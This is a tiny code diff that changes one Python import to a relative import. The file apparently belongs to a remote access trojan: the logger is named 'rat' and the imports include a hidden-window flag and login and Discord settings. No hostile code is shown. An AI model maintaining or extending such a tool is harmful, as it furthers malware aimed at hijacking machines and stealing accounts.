@@ -11,7 +11,7 @@ import shutil
 from pathlib import Path
 from typing import Optional, Set, List
 
-from config import CREATE_NO_WINDOW, _d, _LOGIN, _DISCORD
+from .config import CREATE_NO_WINDOW, _d, _LOGIN, _DISCORD
 
 log = logging.getLogger("rat")
 
